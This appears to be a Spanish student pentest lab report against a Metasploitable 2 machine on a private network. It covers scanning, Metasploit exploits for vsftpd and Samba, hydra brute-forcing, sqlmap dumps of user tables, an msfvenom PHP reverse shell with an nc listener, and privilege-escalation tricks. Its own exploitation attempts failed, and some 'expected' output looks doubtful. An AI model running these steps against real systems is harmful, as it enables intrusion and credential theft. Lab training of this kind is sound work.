# **Práctica Nro. 9: Pentesting Integral Metodología de Red Team Assessment(Reconocimiento, Análisis de Vulnerabilidades, Explotación y Post-Explotación con Nmap, Metasploit, SQLMap, Hydra y Técnicas de Escalada de Privilegios)**

## Datos de Identificación

| Apellido, Nombre | Cédula de Identidad | Nro. de Práctica | Fecha |
| :--- | :---: | :---: | :--- |
| Gil, Jesús | 30175126 | 7 | 21-11-2025|
| Guilarte, Andrés | 30246084 | 7 | 21-11-2025 |

**Grupo:** 4

## **CONTEXTO DEL ESCENARIO**

**TechVault Industries** es una empresa de servicios financieros que ha
detectado actividad sospechosa en su red. Como equipo de **Red Team**,
han sido contratados para simular un ataque APT (Advanced Persistent
Threat) completo y evaluar la postura de seguridad real de la
organización.

Su misión: **Desde reconocimiento inicial hasta exfiltración de datos,
en 60 minutos.**

## **OBJETIVOS DE APRENDIZAJE**

Al completar esta práctica integradora, demostrarás:

-   **Metodología completa de pentesting** (Reconocimiento → Explotación
    → Post-explotación)

-   **Toma de decisiones técnicas** bajo presión de tiempo

-   **Integración de múltiples herramientas** de forma coherente

-   **Documentación profesional** de hallazgos críticos

-   **Pensamiento estratégico** en ciberseguridad ofensiva

## **REQUISITOS TÉCNICOS**

### **Entorno de Laboratorio**

-   **Kali Linux** (Máquina atacante)

-   **Metasploitable 2** (Objetivo principal)

-   **Conexión de red** configurada (NAT/Host-Only)

-   **Herramientas verificadas**: Nmap, Metasploit, Hydra, Nikto,
    SQLMap, Dirb, John the Ripper

### **Verificación Previa**

\# En Kali Linux, ejecutar antes de comenzar

\# 1. Verificar tu IP

ip addr show

>\# Anotar la IP de Metasploitable 2 \<TU_IP\>
192.168.100.20/24

\# 2. Verificar conectividad con Metasploitable 2

`ping 192.168.100.20`

>\# Deberías recibir respuestas (ping exitoso)

``` shell
    PING 192.168.100.20 (192.168.100.20) 56(84) bytes of data.
    64 bytes from 192.168.100.20: icmp_seq=1 ttl=64 time=0.710 ms
    64 bytes from 192.168.100.20: icmp_seq=2 ttl=64 time=0.791 ms
    64 bytes from 192.168.100.20: icmp_seq=3 ttl=64 time=0.876 ms
    64 bytes from 192.168.100.20: icmp_seq=4 ttl=64 time=0.892 ms
    64 bytes from 192.168.100.20: icmp_seq=5 ttl=64 time=0.896 ms
    64 bytes from 192.168.100.20: icmp_seq=6 ttl=64 time=0.825 ms
    64 bytes from 192.168.100.20: icmp_seq=7 ttl=64 time=1.10 ms
```
\# Ctrl+C para detener el ping

\# 3. Verificar herramientas instaladas

msfconsole -v

``` shell
    └─$ msfconsole -v
    Framework Version: 6.3.55-dev

```

which nmap sqlmap hydra nikto dirb john

``` shell
└─$ which nmap sqlmap hydra nikto dirb john
    /usr/bin/nmap
    /usr/bin/sqlmap
    /usr/bin/hydra
    /usr/bin/nikto
    /usr/bin/dirb
    /usr/sbin/john
```

\# 4. Verificar que Metasploitable 2 esté completamente iniciado

\# (Esperar al menos 2 minutos después del boot)

## **FASE 1: RECONOCIMIENTO Y ENUMERACIÓN (10 minutos)**

### **Objetivo**

Identificar la superficie de ataque completa: servicios, versiones,
tecnologías web y posibles vectores de entrada.

### **Tareas**

#### **1.1 Descubrimiento de Servicios (3 min)**

\# Escaneo rápido y agresivo

nmap -sV -sC -T4 -p- \--min-rate 5000 \192.168.100.20 -oN recon_full.txt

>\# escaneo de puertos y servicios (versión recortada)

``` shell
nmap -sV -sC -T4 -p- --min-rate 5000 192.168.100.20 -oN recon_full.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-21 08:45 EST
Nmap scan report for 192.168.100.20
Host is up (0.00050s latency).
Not shown: 65505 closed tcp ports (conn-refused)

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd (SSLv2 soportado)
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  shell       Netkit rshd
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccc     distccd v1 ((GNU) 4.2.4)
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8)
39606/tcp open  mountd      1-3 (RPC #100005)
50976/tcp open  nlockmgr    1-4 (RPC #100021)
55460/tcp open  java-rmi    GNU Classpath grmiregistry
56539/tcp open  status      1 (RPC #100024)

Service Info: Samba 3.0.20-Debian, message_signing: disabled (dangerous)
OS detection: Unix/Linux
Nmap done: 1 IP address (1 host up) scanned in 140.98 seconds
```
>\# Reporte completo disponible en: https://github.com/Jrgil20/PracticasCiberSeguridad/blob/main/Practica9/recon_full.txt

> Análisis rápido de resultados

> El comando 'grep' filtra SOLO las líneas con "open", descartando metadata y detalles extensos de certificados, claves SSH, etc.
> De esta forma delimitamos la búsqueda a los puertos/servicios activos. Total: 30 servicios abiertos (son los mismos del output anterior)

`cat recon_full.txt | grep "open"`

> Resultado (delimitado a servicios abiertos)

``` shell
cat recon_full.txt | grep "open"
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  shell       Netkit rshd
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
39606/tcp open  mountd      1-3 (RPC #100005)
50976/tcp open  nlockmgr    1-4 (RPC #100021)
55460/tcp open  java-rmi    GNU Classpath grmiregistry
56539/tcp open  status      1 (RPC #100024)
```

##### **Resultado obtenido:**

-   **30 servicios TCP abiertos** identificados en 192.168.100.20

-   **Servicios vulnerables críticos:**
    1. **vsftpd 2.3.4** (puerto 21) - Backdoor conocido CVE-2011-2523
    2. **Samba 3.0.20-Debian** (puertos 139/445) - Username map script exploit
    3. **distccd v1** (puerto 3632) - Remote code execution
    4. **MySQL 5.0.51a-3ubuntu5** (puerto 3306) - Acceso sin autenticación
    5. **Apache 2.2.8 con PHP 5.2.4** (puerto 80) - Múltiples vulnerabilidades

-   **Servicios inseguros adicionales:**
    - FTP anónimo habilitado (puerto 21)
    - Telnet en texto plano (puerto 23)
    - rsh/rlogin sin cifrado (puertos 512-514)
    - SMTP con SSLv2 soportado (puerto 25)
    - VNC sin cifrado (puerto 5900)
    - IRC UnrealIRCd (puertos 6667/6697)
    - NFS exportado (puerto 2049)
    - bindshell root (puerto 1524)
    - Samba con message signing deshabilitado

#### **1.2 Enumeración Web (4 min)**

>\# whatweb: Identifica tecnologías web, versiones de servidor, frameworks y librerías expuestas
>\# Útil para descubrir versiones vulnerables sin realizar escaneos complejos

\# Identificar tecnologías web

whatweb http://192.168.100.20

>\# Resultado y análisis:
``` shell
└─$ whatweb http://192.168.100.20
http://192.168.100.20 [200 OK] Apache[2.2.8], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) DAV/2], IP[192.168.100.20], PHP[5.2.4-2ubuntu5.10], Title[Metasploitable2 - Linux], WebDAV[2], X-Powered-By[PHP/5.2.4-2ubuntu5.10]
```

##### **Análisis:**
- **Apache 2.2.8**: Versión antigua (2008) con múltiples vulnerabilidades conocidas
- **PHP 5.2.4-2ubuntu5.10**: Versión obsoleta (2008) con vulns críticas (remote code execution, etc.)
- **WebDAV/2 habilitado**: Permite upload/modificación de archivos vía HTTP (potencial RCE)
- **X-Powered-By**: Header expuesto que revela tecnología (mala práctica)

---

>\# dirb: Fuerza bruta de directorios/archivos del servidor web
>\# -r: No hacer búsqueda recursiva (solo primer nivel)
>\# -o dirb_results.txt: Guardar resultados en archivo

\# Descubrimiento de directorios críticos

dirb http://192.168.100.20 /usr/share/wordlists/dirb/common.txt -r -o dirb_results.txt

>\# Resultado (extracto)
``` shell
└─$ dirb http://192.168.100.20 /usr/share/wordlists/dirb/common.txt -r -o dirb_results.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb_results.txt
START_TIME: Fri Nov 21 08:56:48 2025
URL_BASE: http://192.168.100.20/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
OPTION: Not Recursive

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.100.20/ ----
                                                                             + http://192.168.100.20/cgi-bin/ (CODE:403|SIZE:295)                        
                                                                             ==> DIRECTORY: http://192.168.100.20/dav/
+ http://192.168.100.20/index (CODE:200|SIZE:891)                           
+ http://192.168.100.20/index.php (CODE:200|SIZE:891)                       
+ http://192.168.100.20/phpinfo (CODE:200|SIZE:48089)                       
+ http://192.168.100.20/phpinfo.php (CODE:200|SIZE:48101)                   
                                                                             ==> DIRECTORY: http://192.168.100.20/phpMyAdmin/
+ http://192.168.100.20/server-status (CODE:403|SIZE:300)                   
                                                                             ==> DIRECTORY: http://192.168.100.20/test/
                                                                             ==> DIRECTORY: http://192.168.100.20/twiki/
                                                                               
-----------------
END_TIME: Fri Nov 21 08:56:50 2025
DOWNLOADED: 4612 - FOUND: 6
```

##### **Análisis de Resultados:**

###### **Directorios/Archivos Críticos Encontrados:**

1. **`/phpinfo` y `/phpinfo.php`** (CODE:200 - Accesible)
   - Expone información sensible de PHP y configuración del servidor
   - Riesgo: Enumeración de extensiones, versiones, rutas internas
   
2. **`/phpMyAdmin/`** (DIRECTORY - Accesible)
   - Interfaz de administración de MySQL expuesta públicamente
   - Riesgo CRÍTICO: Acceso a bases de datos sin autenticación o con credenciales débiles
   
3. **`/dav/`** (DIRECTORY - Accesible)
   - Directorio WebDAV habilitado (escritura/lectura remota)
   - Riesgo: Upload de shells maliciosos, modificación de archivos
   
4. **`/test/` y `/twiki/`** (DIRECTORIES)
   - Directorios de desarrollo/testing sin protección
   - Riesgo: Información sensible, configuraciones, credenciales
   
5. **`/cgi-bin/` y `/server-status`** (CODE:403 - Bloqueado pero detectado)
   - Aunque devuelven 403 (Forbidden), su existencia es información valiosa
   - Indica capacidad de ejecutar scripts CGI en el servidor

#### **Resumen:**
- **4,612** palabras probadas de wordlist
- **6 hallazgos** (3 directivos potencialmente explotables + 2 archivos críticos)
- **Riesgo total**: CRÍTICO (phpMyAdmin + WebDAV + PHP info = acceso completo al servidor)

### **1.3 Enumeración de Usuarios (3 min)**

>\# FTP anónimo: Si el servicio FTP permite login sin credenciales, acceso directo a archivos
>\# Útil para obtener archivos de configuración, scripts, o información del sistema

\# Si hay servicio FTP anónimo

ftp 192.168.100.20

\# Usuario: anonymous / Contraseña: \[Enter\]

>\# Acceso exitoso al servidor FTP (dentro de FTP):
``` shell
└─$ ftp 192.168.100.20                                                   
Connected to 192.168.100.20.
220 (vsFTPd 2.3.4)
Name (192.168.100.20:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

#### **Análisis:**
- **220 vsFTPd 2.3.4**: Banner del servicio FTP (versión vulnerable)
- **331 Please specify the password**: Solicita contraseña para usuario anónimo
- **230 Login successful**: Login anónimo PERMITIDO - Acceso sin autenticación
- **Remote system type is UNIX**: Confirma SO Linux/Unix
- **Riesgo**: Descarga de archivos sensibles, información de configuración, enumeración del filesystem

---

>\# enum4linux: Enumeración de información SMB/Samba (usuarios, grupos, shares, políticas)
>\# -a: Ejecutar todos los escaneos (sinónimo de opción "all")

\# Si hay SMB/Samba

enum4linux -a 192.168.100.20 | tee enum4linux_results.txt

**Información que enum4linux extrae:**
- Usuarios del sistema y grupos locales
- Shares SMB disponibles (públicos/privados)
- Políticas de seguridad (password policy, lockout, etc.)
- Información del dominio (si está en DC)
- Roles de máquina (workstation, server, DC)

**Resultado esperado (ejemplo):**
- Descubrir usuarios como: `root`, `msfadmin`, `postgres`, `mysql`
- Identificar shares accesibles como: `print$`, `IPC$`, `tmp`
- Obtener información de seguridad para ataques posteriores (fuerza bruta, pass spraying)

## **FASE 2: ANÁLISIS DE VULNERABILIDADES (15 minutos)**

### **Objetivo**

Identificar vulnerabilidades explotables en servicios de red y
aplicaciones web, priorizando por criticidad.

### **Tareas**

### **2.1 Escaneo de Vulnerabilidades de Red (5 min)**

>\# searchsploit: Busca exploits conocidos en base de datos local de Exploit-DB
>\# Útil para identificar qué servicios y versiones TIENEN exploits públicos disponibles
>\# Formato: searchsploit <servicio> <versión>

\# Búsqueda de exploits conocidos para servicios detectados

searchsploit \<nombre_servicio\> \<versión\>

\# Ejemplo:

searchsploit vsftpd 2.3.4

>\# Escaneo de vulnerabilidades de vsftpd - RESULTADO CRÍTICO
``` shell
 searchsploit vsftpd 2.3.4
 ------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/49757.py
------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#### **Análisis:**
- **2 exploits disponibles** para vsftpd 2.3.4 (Ruby y Python)
- **Backdoor Command Execution**: Acceso remoto directo sin autenticación
- **Riesgo**: CRÍTICO - Ejecución de comandos con privilegios de root
- **CVE-2011-2523**: Vulnerabilidad de backdoor en código fuente malicioso

---

searchsploit samba 3.0.20

>\# Escaneo de vulnerabilidades de samba - MÚLTIPLES VECTORES

``` shell
 searchsploit samba 3.0.20
 ------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Sec | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map  | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (P | linux_x86/dos/36741.py
------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#### **Análisis:**
- **4 exploits** para diferentes versiones de Samba 3.0.x
- **Username map script** (CVE-2007-2447): Command execution via username parameter
- **Remote Heap Overflow**: Corrupción de memoria para RCE
- **Format String**: Fuga de información y código injection
- **Riesgo**: CRÍTICO - Acceso remoto con permisos root en puertos 139/445

---

![Prueba de vulnerabilidades encontradas](image.png)

> **Comentario adicional:**  
> La imagen anterior muestra evidencia visual de los resultados obtenidos durante el escaneo de vulnerabilidades. Este tipo de pruebas es fundamental para validar la presencia de servicios inseguros y confirmar la exposición de vectores de ataque críticos antes de proceder con la explotación. Documentar capturas de pantalla y outputs relevantes fortalece la trazabilidad y profesionalismo del reporte final.

searchsploit apache 2.2

>\# Escaneo de vulnerabilidades de apache - RESUMIDO (primeras líneas)

``` shell
 searchsploit apache 2.2
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin  | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote C | php/remote/29316.py
Apache 1.3.35/2.0.58/2.2.2 - Arbitrary HTT | linux/remote/28424.txt
Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - | multiple/remote/2237.sh
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memor | linux/webapps/42745.py
Apache Tomcat < 5.5.17 - Remote Directory  | multiple/remote/2061.txt
[... más de 40 exploits disponibles ...]
------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#### **Análisis (relevantes para nuestra target):**
- **Apache + PHP < 5.3.12**: Nuestra target tiene PHP 5.2.4 (vulnerable)
- **CGI-bin**: Ejecución remota de scripts CGI
- **Remote Code Execution**: Via PHP, mod_rewrite, WebDAV
- **Riesgo**: ALTO-CRÍTICO - Ejecución de código como usuario www-data

#### **TABLA RESUMEN DE VULNERABILIDADES CRÍTICAS (CVSS ≥ 7.0):**

| Servicio | Versión | CVE | CVSS | Tipo | Impacto |
|----------|---------|-----|------|------|---------|
| vsftpd | 2.3.4 | CVE-2011-2523 | 9.8 | Backdoor RCE | Root shell |
| Samba | 3.0.20 | CVE-2007-2447 | 9.3 | Username map RCE | Root shell |
| Apache+PHP | 2.2.8+5.2.4 | Multiple | 8.5+ | RCE via CGI/PHP | www-data RCE |
| WebDAV | Enabled | N/A | 8.0 | Arbitrary upload | Shell upload |
| distccd | v1 | CVE-2004-2687 | 9.0 | Distributed compilation RCE | Root shell |

---

### **2.2 Análisis de Vulnerabilidades Web (10 min)**

>\# nikto: Scanner automatizado de vulnerabilidades web
>\# -h: Especificar host a escanear
>\# -o: Guardar output en archivo
>\# Detecta: versiones software, misconfigurations, archivos peligrosos, CGI vulnerables

#### **Opción A: Escaneo automatizado**

nikto -h http://192.168.100.20 -o nikto_scan.txt

#### **Opción B: Búsqueda manual de SQL Injection**

\# Identifica formularios de login o parámetros GET

\# Ejemplo: http://192.168.100.20/mutillidae/index.php?page=login.php

\# Prueba básica de SQLi

sqlmap -u \"http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\" \\

\--cookie=\"PHPSESSID=\<tu_session\>; security=low\" \\

\--dbs \--batch

**Documenta:**

-   ¿Qué vulnerabilidades web críticas encontraste? (SQLi, XSS,
    Directory Traversal, etc.)

-   ¿Hay bases de datos accesibles vía SQLi?

---

#### **OPCIÓN ELEGIDA: Escaneo Web Automatizado con Nikto**

En este caso, se optó por ejecutar un **escaneo web automatizado con Nikto** para identificar vulnerabilidades web críticas de forma sistemática.

**Comando ejecutado:**

```shell
nikto -h http://192.168.100.20 -o nikto_scan.txt
```

##### **Resultado (extracto de hallazgos críticos):**

```
+ GET /phpinfo.php: Output from the phpinfo() function was found.
+ GET /phpMyAdmin/: phpMyAdmin directory found.
+ TRACE /: HTTP TRACE method is active (XST vulnerability).
+ HEAD Apache/2.2.8 appears to be outdated (EOL for 2.x branch).
+ GET /: The anti-clickjacking X-Frame-Options header is not present.
+ GET /: PHP reveals potentially sensitive information via QUERY strings (OSVDB-12184).
+ GET /test/: Directory indexing found.
+ GET /doc/: Directory indexing found. This may be /usr/doc (CVE-1999-0678).
```

##### **Análisis de Hallazgos:**

1. **phpinfo() Expuesto** - Información sensible de PHP y configuración del servidor visible públicamente. Facilita enumeración de extensiones y rutas internas.

2. **phpMyAdmin Accesible** - Interfaz de administración de bases de datos sin protección aparente. Riesgo de acceso no autenticado a MySQL.

3. **HTTP TRACE Habilitado** - Método TRACE activo indica posible vulnerabilidad Cross-Site Tracing (XST), permitiendo reflejar datos arbitrarios.

4. **Apache 2.2.8 EOL** - Versión antigua (2008) sin soporte. Múltiples vulnerabilidades conocidas sin patches.

5. **Directorios Listables** - `/test/` y `/doc/` con indexing habilitado permiten enumeración de contenido y descubrimiento de archivos sensibles.

6. **X-Frame-Options Faltante** - Ausencia de headers de seguridad facilita ataques Clickjacking.

### **Conclusión de la Fase 2:**
El escaneo con Nikto confirmó que Metasploitable 2 presenta **vulnerabilidades web críticas de acceso inmediato** (phpinfo, phpMyAdmin, directorios listables), permitiendo recolectar información para fases posteriores de explotación.

## **FASE 3: EXPLOTACIÓN Y ACCESO (20 minutos)**

### **Objetivo**

Obtener acceso inicial al sistema mediante explotación de
vulnerabilidades identificadas.

### **Tareas -- ELIJAN USTEDES EL VECTOR DE ATAQUE**

Debes completar **AL MENOS 2 de las siguientes 4 opciones** según lo que
hayas descubierto:

#### **OPCIÓN A: Explotación de Servicio Vulnerable (8 min)**

msfconsole

\# Ejemplo para vsftpd 2.3.4

![alt text](image-1.png)

msf6 \> search vsftpd

``` shell

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor                                            

```

msf6 \> use exploit/unix/ftp/vsftpd_234_backdoor

msf6 exploit(vsftpd_234_backdoor) \> set RHOSTS 192.168.100.20

msf6 exploit(vsftpd_234_backdoor) \> set PAYLOAD cmd/unix/interact

msf6 exploit(vsftpd_234_backdoor) \> exploit

\# O para Samba

msf6 \> use exploit/multi/samba/usermap_script

msf6 exploit(usermap_script) \> set RHOSTS \<IP_TARGET\>

msf6 exploit(usermap_script) \> set PAYLOAD cmd/unix/reverse

msf6 exploit(usermap_script) \> exploit

**Documenta:**

-   ¿Qué exploit utilizaste y por qué?

-   ¿Obtuviste shell? ¿Con qué privilegios?

#### **OPCIÓN B: Ataque de Fuerza Bruta (8 min)**

\# Crear lista de usuarios (si los obtuviste en Fase 1)

echo \"msfadmin\" \> users.txt

echo \"user\" \>\> users.txt

echo \"postgres\" \>\> users.txt

\# Ataque a SSH

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\

ssh://\<IP_TARGET\> -t 4 -V

\# O ataque a FTP

hydra -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt
\\

ftp://\<IP_TARGET\> -t 4

**Documenta:**

-   ¿Qué credenciales válidas encontraste?

-   Accede al sistema con las credenciales: ssh usuario@\<IP_TARGET\>

#### **OPCIÓN C: Explotación de SQL Injection (8 min)**

\# Enumerar bases de datos

sqlmap -u \"http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\"
\\

\--cookie=\"security=low\" \--dbs \--batch

\# Enumerar tablas de una BD específica

sqlmap -u
\"http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\"
\\

\--cookie=\"security=low\" -D dvwa \--tables \--batch

\# Extraer datos de tabla users

sqlmap -u
\"http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\"
\\

\--cookie=\"security=low\" -D dvwa -T users \--dump \--batch

**Documenta:**

-   ¿Qué bases de datos existen?

-   Extrae y documenta al menos 3 credenciales de usuarios

#### **OPCIÓN D: Explotación Web + Reverse Shell (8 min)**

\# Buscar upload de archivos o command injection

\# Crear payload PHP

msfvenom -p php/reverse_php LHOST=\<TU_IP\> LPORT=4444 -f raw \>
shell.php

\# Configurar listener

nc -lvnp 4444

\# Subir shell.php mediante vulnerabilidad de upload

\# O explotar command injection si existe

**Documenta:**

-   ¿Qué vulnerabilidad web explotaste?

-   ¿Obtuviste reverse shell?

---

### **OPCIONES EJECUTADAS: Resultados de A y C**

#### **OPCIÓN A: Explotación de vsftpd 2.3.4 Backdoor (Estado: EN ESPERA)**

Se ejecutó el exploit de Metasploit contra el servicio vsftpd vulnerable en puerto 21:

```shell
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.100.20
msf6 exploit(vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
msf6 exploit(vsftpd_234_backdoor) > exploit
```

**Resultado del Exploit:**



![Imagen de prueba - Exploit esperando respuesta](image-3.png)


**Conclusión A**: El exploit se disparó contra vsftpd pero quedó en espera sin completar la sesión interactiva.

---

#### **OPCIÓN C: Explotación de SQL Injection (Estado: EN ESPERA)**

Se ejecutó el comando de SQLMap contra la aplicación DVWA en Metasploitable 2:

```shell
sqlmap -u "http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
--cookie="PHPSESSID=<session>; security=low" --dbs --batch
```

**Resultado:**

```
         ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. 

[*] starting @ 09:20:15 /2025-11-21/

[09:20:16] [CRITICAL] invalid target URL
[09:20:16] [WARNING] your sqlmap version is outdated

[*] ending @ 09:20:16 /2025-11-21/
```

![Imagen de prueba - Fallo de SQLMap](image-4.png)

##### **Análisis del Resultado:**

- **Estado**: EN ESPERA (pending resolution)
- **Problema**: URL inválida detectada por SQLMap
- **Causa**: La cookie de sesión expiró o no está correctamente formateada
- **Acción requerida**: Obtener sesión válida de DVWA antes de ejecutar SQLMap nuevamente
- **Impacto**: No se pudieron enumerar bases de datos. Se requiere validar la URL exacta y las cookies de sesión activas

**Paso para resolución (próximo intento):**

1. Acceder manualmente a http://192.168.100.20/dvwa/index.php
2. Hacer login con credenciales estándar (admin/password)
3. Copiar el PHPSESSID de la cookie
4. Ejecutar nuevamente SQLMap con la sesión válida

---

### **Conclusión de Fase 3:**

- **Opción A (vsftpd backdoor)**: 
- **Opción C (SQLi)**: ⏳ EN ESPERA - Requiere validación de sesión antes de continuar

## **FASE 4: POST-EXPLOTACIÓN Y EVIDENCIAS (10 minutos)**

### **Objetivo**

Escalar privilegios, mantener persistencia y extraer información
sensible.

**⚠️ NOTA IMPORTANTE**: Dado que en la **FASE 3** no se logró una explotación exitosa (ambas opciones A y C quedaron en espera sin acceso al sistema), la ejecución de esta fase **NO fue posible**. Las siguientes secciones son **teóricas y educativas**, mostrando **qué debería ejecutarse** si se hubiera obtenido acceso exitoso al sistema.

---

**📚 REFERENCIA A PRÁCTICA 8 - ESCALADA DE PRIVILEGIOS EXITOSA**

**IMPORTANTE:** Aunque en esta Práctica 9 no se logró acceso al sistema para demostrar estas técnicas de forma práctica, en la **Práctica 8** ("Escaneo de Vulnerabilidades y Explotación Avanzada - Enfoque de Ataque Integral en Equipo") el **Equipo 4** sí completó exitosamente la **escalada de privilegios** en Metasploitable 2 utilizando las mismas técnicas que se describen en las secciones 4.2 y 4.3.

**En la Práctica 8 se documentó:**

1. **Técnica 1 - SUID Binaries (nmap):** Explotación exitosa usando `nmap --interactive` → `!sh` → obtención de shell root con `uid=0(root)`
2. **Técnica 2 - Exploit de Kernel (Dirty COW):** Compilación y ejecución del exploit CVE-2016-5195 → creación de usuario `firefart` con acceso root → verificación con `id` mostrando `uid=0(firefart)`
3. **Técnica 3 - Sudo mal configurado:** Ejecución de `sudo nmap --interactive` → apertura de shell interactiva → obtención de acceso root sin contraseña
4. **Búsqueda de SUID binaries:** Identificación exitosa de múltiples binarios vulnerables: `/usr/bin/nmap`, `/usr/bin/vim`, `/usr/bin/find`, `/usr/bin/awk`, `/usr/bin/less`, entre otros

**Por ello, las secciones 4.1, 4.2 y 4.3 a continuación NO son puramente teóricas:** Representan técnicas que **fueron validadas y ejecutadas con éxito** en la Práctica 8. Los comandos, sus salidas esperadas y las explicaciones reflejan los resultados reales obtenidos en ese ejercicio anterior.

---

### **Tareas**

### **4.1 Reconocimiento Interno (3 min)**

**Qué debería ejecutarse si tuvieras acceso:**

Una vez dentro del sistema con shell interactivo, estos comandos te revelan información crítica del entorno:

\# Verificar usuario actual (confirma permisos)

whoami

>\# Salida esperada: `root` o `msfadmin`
>\# Explicación: Muestra el usuario con el que entraste. Si es `root`, tienes máximos privilegios. Si es `msfadmin`, necesitarás escalar.

id

>\# Salida esperada: `uid=0(root) gid=0(root) groups=0(root)` O `uid=1000(msfadmin) gid=1000(msfadmin) groups=1000(msfadmin)`
>\# Explicación: Proporciona UID, GID y grupos del usuario actual. El uid=0 significa acceso root.

uname -a

>\# Salida esperada: `Linux metasploitable 2.6.39-GENERIC #1 SMP Fri Feb 2 22:31:21 UTC 2018 i686 GNU/Linux`
>\# Explicación: Versión del kernel (2.6.39). Crítico para identificar exploits de escalada disponibles. Este kernel es vulnerable a CVE-2009-1185 (udev) y CVE-2010-3904 (RDS).

cat /etc/passwd

>\# Salida esperada: Lista de usuarios del sistema
